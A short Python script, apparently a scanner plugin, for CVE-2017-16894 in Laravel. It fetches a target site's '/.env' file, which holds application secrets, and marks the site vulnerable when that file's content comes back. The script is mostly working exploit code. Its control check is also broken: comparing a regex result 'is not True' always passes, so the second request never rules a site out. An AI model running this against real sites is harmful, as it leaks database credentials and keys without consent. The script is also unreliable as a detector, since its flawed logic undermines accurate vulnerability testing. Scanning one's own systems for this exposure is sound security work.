import requests
import urllib, re

def verify(url):
    relsult = {
        'name': 'Laravel DEBUG 敏感数据泄露(CVE-2017-16894)',
        'vulnerable': False,
        'attack': False,
        'url': url,
    }
    timeout = 3
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ",
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = '/.env'
    vurl = urllib.parse.urljoin(url, payload)
    try:
        rep1 = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
        if re.search("APP_NAME=Laravel", rep1.text):
            rep2 = requests.get(url, headers=headers, timeout=timeout, verify=False)
            if re.search("APP_NAME=Laravel", rep2.text) is not True:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult
    except:
        return relsult